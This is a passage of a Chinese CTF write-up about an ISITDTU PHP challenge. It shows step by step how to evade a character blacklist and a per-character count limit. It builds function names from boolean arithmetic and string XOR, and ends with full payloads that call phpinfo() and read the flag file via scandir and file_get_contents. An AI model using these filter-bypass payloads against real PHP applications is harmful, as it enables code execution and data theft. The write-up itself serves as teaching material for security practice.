class="hljs-number">1255</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">6</span>) <span class="hljs-string">"intval"</span></span><br><span class="line">  [<span class="hljs-number">1403</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">4</span>) <span class="hljs-string">"mail"</span></span><br><span class="line">  [<span class="hljs-number">1444</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">3</span>) <span class="hljs-string">"min"</span></span><br><span class="line">  [<span class="hljs-number">1445</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">3</span>) <span class="hljs-string">"max"</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这样这题看起来与国赛那个 Love_Math 题目就有点类似了，看起来<code>intval</code>跟<code>chr</code>貌似有点搞头，但是数字却又被 ban 掉了…那我们就只能另寻他路了…</p><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>虽然双引号跟单引号都被 ban 掉了，但是我们知道 php 在获取 HTTP GET 参数的时候默认是获得到了字符串类型，所以即使双引号跟单引号被 ban 了其实并没有太大的影响。而我们还可以知道，字符串还可以用<code>!</code>操作符来进行布尔类型的转换，如下：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(!a);</span><br><span class="line">PHP Notice:  <span class="hljs-keyword">Use</span> <span class="hljs-title">of</span> <span class="hljs-title">undefined</span> <span class="hljs-title">constant</span> <span class="hljs-title">a</span> - <span class="hljs-title">assumed</span> '<span class="hljs-title">a</span>' <span class="hljs-title">in</span> <span class="hljs-title">php</span> <span class="hljs-title">shell</span> <span class="hljs-title">code</span> <span class="hljs-title">on</span> <span class="hljs-title">line</span> 1</span><br><span class="line"><span class="hljs-title">bool</span>(<span class="hljs-title">false</span>)</span><br><span class="line"><span class="hljs-title">php</span> &gt; <span class="hljs-title">var_dump</span>(!!<span class="hljs-title">a</span>);</span><br><span class="line">PHP Notice:  <span class="hljs-keyword">Use</span> <span class="hljs-title">of</span> <span class="hljs-title">undefined</span> <span class="hljs-title">constant</span> <span class="hljs-title">a</span> - <span class="hljs-title">assumed</span> '<span class="hljs-title">a</span>' <span class="hljs-title">in</span> <span class="hljs-title">php</span> <span class="hljs-title">shell</span> <span class="hljs-title">code</span> <span class="hljs-title">on</span> <span class="hljs-title">line</span> 1</span><br><span class="line"><span class="hljs-title">bool</span>(<span class="hljs-title">true</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>可以再加一个<code>@</code>忽略 notice 输出</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">var_dump(@a);<span class="hljs-comment">//string(1) "a"</span></span><br><span class="line">var_dump(!@a);<span class="hljs-comment">//bool(false)</span></span><br><span class="line">var_dump(!!@a);<span class="hljs-comment">//bool(true)</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>而对 bool 类型使用加法的时候， php 则会将 bool 类型处理为数字，<code>true</code> 转换为 1 ， <code>false</code> 为 0 ，所以我们又可以利用这一点来实现数字计算：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">var_dump(!!@a + !!@a);<span class="hljs-comment">//int(2) 1+1</span></span><br><span class="line">var_dump((!!@a + !!@a) * (!!@a + !!@a + !!@a + !!@a));<span class="hljs-comment">//int(6) (1+1)*(1+1+0+1)</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>所以，这样大概我们就可以利用<code>chr()</code>进行数字转换得到字符了，并且我们还可以利用<code>"phpinfo"()</code>的特性，通过字符串拼凑，可以得到 phpinfo:</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a) ** (!!@a + !!@a  + !!@a + !!@a))</span><br><span class="line">.chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a + !!@a + !!@a ) * (!!@a + !!@a  + !!@a + !!@a + !!@a  + !!@a ))</span><br><span class="line">.chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a) ** (!!@a + !!@a  + !!@a + !!@a))</span><br><span class="line">.chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a + !!@a + !!@a ) * (!!@a + !!@a  + !!@a + !!@a + !!@a  + !!@a ) + !!@a)</span><br><span class="line">.chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a) * ((!!@a + !!@a  + !!@a) ** (!!@a + !!@a) ))</span><br><span class="line">.chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a + !!@a + !!@a ) * (!!@a + !!@a  + !!@a + !!@a + !!@a  + !!@a ) - !!@a - !!@a)</span><br><span class="line">.chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a) ** (!!@a + !!@a  + !!@a + !!@a) - !!@a))();</span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190713013742.jpg" alt=""></p><p>但是这里要需要用到<code>.</code>进行字符串拼接，然而<code>.</code>又被 ban 掉了，所以我们得另寻他路</p><h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><p>观察正则表达式，我们还可以使用的符号有：</p><p></p><figure class="highlight scheme hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-symbol">'!</span>', <span class="hljs-symbol">'%</span>', <span class="hljs-symbol">'+</span>', <span class="hljs-symbol">'-</span>', <span class="hljs-symbol">'*</span>', <span class="hljs-symbol">'/</span>', <span class="hljs-symbol">'&gt;</span>', <span class="hljs-symbol">'&lt;</span>', <span class="hljs-symbol">'?</span>', <span class="hljs-symbol">'=</span>', <span class="hljs-symbol">':</span>', <span class="hljs-symbol">'@</span>', <span class="hljs-symbol">'^</span>']</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以注意到另一个比较明显的点，就是<code>^</code>异或符号没有被 ban ，在一些免杀马里面就经常用<code>^</code>异或来进行混淆。通过查阅<a href="https://www.php.net/manual/zh/language.operators.bitwise.php" target="_blank" rel="noopener"> php文档</a> 我们可以知道</p><blockquote><p>​    If both operands for the <em>&amp;</em>, <em>|</em> and <em>^</em> operators are strings, then the operation will be performed on the ASCII values of the characters that make up the strings and the result will be a string. In all other cases, both operands will be<a href="https://www.php.net/manual/zh/language.types.integer.php#language.types.integer.casting" target="_blank" rel="noopener">converted to integers</a> and the result will be an integer.</p></blockquote><p>字符串的异或操作是基于字符的 ASCII 码来进行操作的，例如：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(@a^<span class="hljs-string">"1"</span>);</span><br><span class="line">string(<span class="hljs-number">1</span>) <span class="hljs-string">"P"</span></span><br><span class="line">php &gt; <span class="hljs-keyword">echo</span> ord(<span class="hljs-string">"a"</span>);</span><br><span class="line"><span class="hljs-number">97</span></span><br><span class="line">php &gt; <span class="hljs-keyword">echo</span> ord(<span class="hljs-string">"1"</span>);</span><br><span class="line"><span class="hljs-number">49</span></span><br><span class="line">php &gt; <span class="hljs-keyword">echo</span> <span class="hljs-number">97</span>^<span class="hljs-number">49</span>;</span><br><span class="line"><span class="hljs-number">80</span></span><br><span class="line">php &gt; <span class="hljs-keyword">echo</span> chr(<span class="hljs-number">80</span>);</span><br><span class="line">P</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们就可以利用之前的数字操作加上异或就可以得到我们自己想要的操作了。</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(@p^<span class="hljs-string">"1"</span>);</span><br><span class="line">string(<span class="hljs-number">1</span>) <span class="hljs-string">"A"</span></span><br><span class="line">php &gt; var_dump(@h^<span class="hljs-string">"1"</span>);</span><br><span class="line">string(<span class="hljs-number">1</span>) <span class="hljs-string">"Y"</span></span><br><span class="line">php &gt; var_dump(@i^<span class="hljs-string">"1"</span>);</span><br><span class="line">string(<span class="hljs-number">1</span>) <span class="hljs-string">"X"</span></span><br><span class="line">php &gt; var_dump(@n^<span class="hljs-string">"4"</span>);</span><br><span class="line">string(<span class="hljs-number">1</span>) <span class="hljs-string">"Z"</span></span><br><span class="line">php &gt; var_dump(@f^<span class="hljs-string">"1"</span>);</span><br><span class="line">string(<span class="hljs-number">1</span>) <span class="hljs-string">"W"</span></span><br><span class="line">php &gt; var_dump(@o^<span class="hljs-string">"5"</span>);</span><br><span class="line">string(<span class="hljs-number">1</span>) <span class="hljs-string">"Z"</span></span><br><span class="line">php &gt; var_dump(@phpinfo^<span class="hljs-string">"1111415"</span>);</span><br><span class="line">string(<span class="hljs-number">7</span>) <span class="hljs-string">"AYAXZWZ"</span></span><br><span class="line">php &gt; var_dump(@AYAXZWZ^<span class="hljs-string">"1111415"</span>);</span><br><span class="line">string(<span class="hljs-number">7</span>) <span class="hljs-string">"phpinfo"</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>接下来就是数学时间了，另外，对于 int 型到 string 的转换，我们可以利用<code>trim</code>进行操作。</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var_dump(</span><br><span class="line">    trim(</span><br><span class="line">        (!!@a + !!@a + !!@a + !!@a + !!@a) *</span><br><span class="line">        ((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) + (!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a) + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) *</span><br><span class="line">        ((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a+ !!@a+ !!@a) + (!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a ) - (!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a) - !!@a - !!@a- !!@a)</span><br><span class="line">    ) ^ @AYAXZWZ</span><br><span class="line">);<span class="hljs-comment">//phpinfo</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190713122647.jpg" alt=""></p><p>结果回显<code>you are so close, omg</code></p><h3 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h3><p>绕过了正则接下来就是处理每个字符出现次数得小于 13 的问题了。</p><p>所以我们需要精简一下异或操作，尽量找一些相同的字符进行操作，我们可以找到如下的异或关系：</p><p></p><figure class="highlight gherkin hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p: |<span class="hljs-string">A ^ 1</span>|<span class="hljs-string">B ^ 2</span>|<span class="hljs-string">C ^ 3</span>|<span class="hljs-string">H ^ 8</span>|<span class="hljs-string">I ^ 9</span>|</span><br><span class="line">h: |<span class="hljs-string">Q ^ 9</span>|<span class="hljs-string">X ^ 0</span>|<span class="hljs-string">Y ^ 1</span>|<span class="hljs-string">Z ^ 2</span>|</span><br><span class="line">p: |<span class="hljs-string">A ^ 1</span>|<span class="hljs-string">B ^ 2</span>|<span class="hljs-string">C ^ 3</span>|<span class="hljs-string">H ^ 8</span>|<span class="hljs-string">I ^ 9</span>|</span><br><span class="line">i: |<span class="hljs-string">Q ^ 8</span>|<span class="hljs-string">X ^ 1</span>|<span class="hljs-string">Y ^ 0</span>|<span class="hljs-string">Z ^ 3</span>|</span><br><span class="line">n: |<span class="hljs-string">V ^ 8</span>|<span class="hljs-string">W ^ 9</span>|<span class="hljs-string">X ^ 6</span>|<span class="hljs-string">Y ^ 7</span>|<span class="hljs-string">Z ^ 4</span>|</span><br><span class="line">f: |<span class="hljs-string">Q ^ 7</span>|<span class="hljs-string">R ^ 4</span>|<span class="hljs-string">T ^ 2</span>|<span class="hljs-string">U ^ 3</span>|<span class="hljs-string">V ^ 0</span>|<span class="hljs-string">W ^ 1</span>|</span><br><span class="line">o: |<span class="hljs-string">V ^ 9</span>|<span class="hljs-string">W ^ 8</span>|<span class="hljs-string">X ^ 7</span>|<span class="hljs-string">Y ^ 6</span>|<span class="hljs-string">Z ^ 5</span>|</span><br></pre></td></tr></tbody></table></figure><p></p><p>尽量找到相同字符进行拼凑，我们就可以得到<code>AYAYYRY ^ 1110746</code>，<code>AYR</code>加上<code>trim</code>中的<code>tim</code>，再加上<code>!!(+*);</code>，我们这样只用 13 个字符得到了<code>phpinfo()</code>。</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(AYAYYRY^trim(((((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a)))+(((!!a+!!a))**((!!a))))))();</span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190714001039.png" alt=""></p><p>这里可能需要注意的就是将<code>+</code>进行 urlencode ，因为<code>+</code>在 url 中是空格。</p><h3 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h3><p>所以我们只需要按照同样的编码方式，尽量找相同的字符，就可以执行相关的 php 函数了，通过以下步骤就可以拿到 flag 了</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(getcwd()));</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>) { [<span class="hljs-number">0</span>]=&gt; string(<span class="hljs-number">1</span>) <span class="hljs-string">"."</span> [<span class="hljs-number">1</span>]=&gt; string(<span class="hljs-number">2</span>) <span class="hljs-string">".."</span> [<span class="hljs-number">2</span>]=&gt; string(<span class="hljs-number">9</span>) <span class="hljs-string">"index.php"</span> [<span class="hljs-number">3</span>]=&gt; string(<span class="hljs-number">34</span>) <span class="hljs-string">"n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt"</span> }</span><br><span class="line"></span><br><span class="line">var_dump(file_get_contents(end(scandir(getcwd()))));</span><br><span class="line"></span><br><span class="line">string(<span class="hljs-number">34</span>) <span class="hljs-string">"ISITDTU{Your PHP skill is so good}"</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Another-Way-Step-1"><a href="#Another-Way-Step-1" class="headerlink" title="Another Way-Step 1"></a>Another Way-Step 1</h3><p>单次异或可能会有一定的局限性，我们也可以通过两次或者多次异或来进行字符串的构造：</p><p></p><figure class="highlight php 